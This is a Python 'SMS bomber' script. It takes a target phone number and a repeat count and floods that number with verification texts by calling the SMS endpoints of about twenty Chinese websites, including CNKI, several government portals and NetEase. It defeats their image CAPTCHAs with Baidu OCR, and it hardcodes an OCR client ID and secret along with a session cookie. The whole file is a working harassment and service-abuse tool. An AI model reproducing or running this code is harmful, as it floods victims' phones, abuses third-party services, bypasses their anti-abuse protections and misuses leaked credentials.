from threading import Thread, current_thread
from asyncio import run_coroutine_threadsafe
from importlib.util import resolve_name
from pickletools import read_uint1
from webbrowser import get
from lxml import etree
from PIL import Image
import time
import requests
import base64
import sys
ocr_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"
access_host = 'https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id=DibHBuAo1mE0lkyGRBtEGfBa&client_secret=ZYj4hxduAvhZGq9ti5my74q7wslqG92k'
access_response = requests.get(access_host)
if access_response:
    access_token = access_response.json()['access_token']
else:
    print ('[程序] ACCESS_TOKEN 获取出现问题，可能是网络出现波动')
    time.sleep(3)
    exit()
# 13位时间戳
def get_time():
    return str(int(time.time() * 1000))
def ocr(imgtext):
    img = base64.b64encode(imgtext)
    params = {"image":img}
    request_url = ocr_url + "?access_token=" + access_token
    ocr_headers = {'content-type': 'application/x-www-form-urlencoded'}
    ocr_response = requests.post(url=request_url, data=params, headers=ocr_headers)
    if ocr_response:
        print ('[PROGRAM] '+ocr_response.text)
        try:
            return ocr_response.json()['words_result'][0]['words']
        except Exception as e:
            print('[PROGRAM] OCR ERROR.')
            return "NMSL"
try:
    mobile = sys.argv[1]
    count = sys.argv[2]
except:
    mobile = input('手机号:')
    count = input('次数:')
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'
}
def sms_get():
    for counted in range(int(count)):
        # 中国知网
        code_url = "https://my.cnki.net/Register/CheckCode.aspx"
        response = requests.get(url=code_url,headers=headers)
        code = ocr(response.content)
        cookies = response.cookies.get_dict()
        sms_url_1 = 'https://my.cnki.net/Register/Server.aspx?imageCode='+code+'&checkFlag=1&operatetype=7'
        sms_response = requests.get(url=sms_url_1,headers=headers,cookies=cookies)
        if(sms_response.text == '1'):
            sms_url_2 = 'https://my.cnki.net/Register/Server.aspx?mobile='+mobile+'&temp='+get_time()+'&operatetype=2&imageCode='+code
            fina_response = requests.post(url=sms_url_2,headers=headers,cookies=cookies)
            if(fina_response.text == '1'):
                print('[中国知网] 发送成功')
            else:
                print('[中国知网] 未知 | '+fina_response.text)
        else:
            print('[中国知网] 验证码错误')

        # 共产党员网
        code_url = 'https://passport.12371.cn/loginCode'
        response = requests.get(url=code_url,headers=headers)
        code = ocr(response.content)
        sms_url = 'https://passport.12371.cn/security/getMobileCode?type=regist&mobile='+mobile+'&loginCode='+code
        cookies = response.cookies.get_dict()
        sms_response = requests.get(url=sms_url,headers=headers,cookies=cookies)
        print ('[共产党员网] '+sms_response.json()['rspcod'])

        # 长春新区科技创新服务平台
        sms_url = 'http://st.ccxq.gov.cn/account/get_code'
        data = {
            'mobile_email' : mobile
        }
        sms_response = requests.post(url=sms_url,data=data,headers=headers)
        print ("[长春新区科技创新服务平台] "+sms_response.json()['msg'])

        # 12123
        code_url = 'https://jiekou.hljga.gov.cn/cs/shengChengYzm.go?yzid=7a8778f3-6c4e-411f-a9cf-bd6cfe3f5dcd'
        response = requests.get(url=code_url,headers=headers)
        code = ocr(response.content)
        sms_url = 'http://jiekou.hljga.gov.cn:8088/cs/login/vadatorCode/sendCode.go'
        data = {
            'mobile': mobile,
            'yzid': '7a8778f3-6c4e-411f-a9cf-bd6cfe3f5dcd',
            'yzm': code
        }
        sms_response = requests.post(url=sms_url,headers=headers,cookies=response.cookies.get_dict(),data=data)
        print ('[12123] ' + sms_response.text)

        # 国家大剧院
        code_url = 'http://store.ncpa-classic.com/api/comm/getImageCode?deviceType=6&callback=?&rnd=0.9851366036485723'
        response = requests.get(url=code_url,headers=headers)
        code = ocr(response.content)
        sms_url = 'http://store.ncpa-classic.com/api/comm/smsNew?callback=jQuery17203019595320998705_1656331468616&mobile='+mobile+'&authType=1&deviceType=6&imageCode='+code+'&_='+get_time()
        sms_response = requests.get(url=sms_url,headers=headers,cookies=response.cookies.get_dict())
        print ('[国家大剧院] ' + sms_response.text)

        # 长沙市人民政府
        special_headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-TW,zh;q=0.9',
            'Connection': 'keep-alive',
            'Content-Length': '0',
            'Cookie': 'JSESSIONID=5A76DCFE2CD4EEF540742A5FEBF04A65',
            'Host': 'wlwz.changsha.gov.cn',
            'Origin': 'http://wlwz.changsha.gov.cn',
            'Referer': 'http://wlwz.changsha.gov.cn/webapp/cs/register/register_2.htm',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
        }
        sms_url = 'http://wlwz.changsha.gov.cn/creatorCMS/appManage/email/sendRegisterSMS.page?Mobiles=' + mobile
        sms_response = requests.get(url=sms_url,headers=special_headers)
        print ('[长沙市人民政府] '+sms_response.text)

        # go007
        code_url = 'http://user.go007.com/plus/getCodeRandom.aspx?random=373'
        response = requests.get(url=code_url,headers=headers)
        code = ocr(response.content)
        sms_url = 'http://user.go007.com/ajaxhandler.ashx'
        data = {
            'action': 'RegByMobile',
            'phone': mobile,
            'CheckCode': code
        }
        sms_response = requests.post(url=sms_url,headers=headers,cookies=response.cookies.get_dict(),data=data)
        print('[go007] ' + sms_response.text)

        # 湖南省网上信访投诉平台
        code_url = 'https://wsxf.hunan.gov.cn/zfp/Random.cmd'
        response = requests.get(url=code_url,headers=headers)
        code = ocr(response.content)
        sms_url = 'https://wsxf.hunan.gov.cn/zfp/sendvalidatecodeservice/sendcode?theme=none'
        data = {
            'phone': mobile,
            'type': '1',
            'txyzm': code
        }
        sms_response = requests.post(url=sms_url,headers=headers,cookies=response.cookies.get_dict(),data=data)
        print('[湖南省网上信访投诉平台] ' + sms_response.text)

        # 纳米人
        sms_url = 'http://www.nanoer.net/phone/e/extend/dysms/api_demo/SmsDemo.php'
        data = {
            'phone': mobile
        }
        sms_response = requests.post(url=sms_url,headers=headers,data=data)
        print('[纳米人] ' + sms_response.json()['Message'])

        # artrade
        code_url = 'http://www.artrade.com/validateCode'
        response = requests.get(url=code_url,headers=headers)
        code = ocr(response.content)
        sms_url = 'http://www.artrade.com/common/msgcode/getcode.action'
        data = {
            'path': 'regist',
            'mbrMobile': mobile,
            'mmsy': code
        }
        sms_response = requests.post(url=sms_url,headers=headers,cookies=response.cookies.get_dict(),data=data)
        print('[artrade] ' + sms_response.json()['data'])

        # pmichina
        code_url = 'https://www.pmichina.org/captcha.svl'
        response = requests.get(url=code_url,headers=headers)
        code = ocr(response.content)
        data = {
            'mobilePhone': mobile,
            'smsSendType': '1',
            'vCode': code
        }
        sms_url = 'https://www.pmichina.org/sms/send_register_msg.jspx'
        sms_response = requests.post(url=sms_url,headers=headers,cookies=response.cookies.get_dict(),data=data)
        print('[pmichina] ' + sms_response.json()['message'])

        # ybschool
        sms_url = 'http://www.ybschool.cn/index/smsSend'
        data = {
            'mobile': mobile,
            'sendType': '1'
        }
        sms_response = requests.post(url=sms_url,headers=headers,data=data)
        print('[ybschool] ' + sms_response.json()['send_message'])    

        # hzsteel
        sms_url = 'http://bid.hzsteel.com/front/web/register/sendSmsChkCode.jhtml'
        data = {
            'mobile': mobile,
            'ccode': 'undefined',
            'channelCode': 'EPS'
        }
        sms_response = requests.post(url=sms_url,headers=headers,data=data)
        print('[hzsteel] ' + sms_response.json()['msg'])       

        # jinrongren
        code_url = 'http://e.jinrongren.net/send_message/seccode/?3.1888967487909'
        response = requests.get(url=code_url,headers=headers)
        code = ocr(response.content)
        sms_url = 'http://e.jinrongren.net/send_message/setphonezc/type/4/?callback=jQuery18005709466493369213_1656935464077'
        data = {
            'user': mobile,
            'msgpic': code
        }
        sms_response = requests.post(url=sms_url,headers=headers,cookies=response.cookies.get_dict(),data=data)
        if (sms_response.text == 'jQuery18005709466493369213_1656935464077({"recode":2,"mag":"\u77ed\u4fe1\u53d1\u9001\u6210\u529f"})'):
            print("[jinrongren] 发送成功")
        else:
            print("[jinrongren] 发送失败")
        
        # crup
        code_url = 'http://www.crup.com.cn/ValidateCode'
        response = requests.get(url=code_url,headers=headers)
        code = ocr(response.content)
        sms_url = 'http://www.crup.com.cn/Account/CheckUserExist'
        data = {
            'MOBILEPHONE': mobile,
            'vcode': code
        }
        sms_response = requests.post(url=sms_url,headers=headers,cookies=response.cookies.get_dict(),data=data)
        print('[crup] ' + sms_response.text)

        # qinghuaxuetang
        code_url = 'http://www.qinghuaxuetang.cn/ywxtStudent/pcrimg'
        response = requests.get(url=code_url,headers=headers,verify = False)
        code = ocr(response.content)
        sms_url = 'http://www.qinghuaxuetang.cn/ywxtStudent/sendRegisterMsg?mobile='+mobile+'&type=1&verify='+code+'&areaCode=86'
        sms_response = requests.get(url=sms_url,headers=headers,cookies=response.cookies.get_dict(),verify = False)
        print('[qinghuaxuetang] ' + sms_response.json()['data'])

        # 七联大学
        sms_url = 'http://ut7.whu.edu.cn/Home/studentCommon/Student_getVerifyCode'
        data = {
            'phoneNumber': mobile,
            'sendType': '0'
        }
        sms_response = requests.post(url=sms_url,headers=headers,data=data)
        print('[七联大学] ' + sms_response.json()['msg']) 

        # 网易云游戏
        data={
                "etc": {
                    "validate": ""
                }
            }
        sms_url = 'https://n.cg.163.com/api/v1/phone-captchas/86-' + mobile
        sms_response = requests.post(url=sms_url,headers=headers,data=data)
        print('[网易云游戏] 发送成功') 
        
        # 政务短信平台
        sms_url = 'https://gl.gdedu.gov.cn/api-service/captcha?phoneNumber='+mobile+'&captchaType=QUERY_ADMIN'
        sms_response = requests.get(url=sms_url,headers=headers)
        print('[政务短信平台] ' + sms_response.json()['msg'])

        # 双语优榜
        sms_url = 'https://capi.sybrank.com/he/teacher/account/sendcode?os=Android&v=2.6&phone='+mobile+'&type=login'
        sms_response = requests.get(url=sms_url,headers=headers)
        print('[双语优榜] ' + sms_response.text)
        if count != 1:
            for timewaitcount in range(40):
                print('[' + current_thread().getName() + '] 正在等待 (' + str(timewaitcount) + ') 秒')
                time.sleep(1)
# ===Main===

simple = Thread(target=sms_get)
simple.start()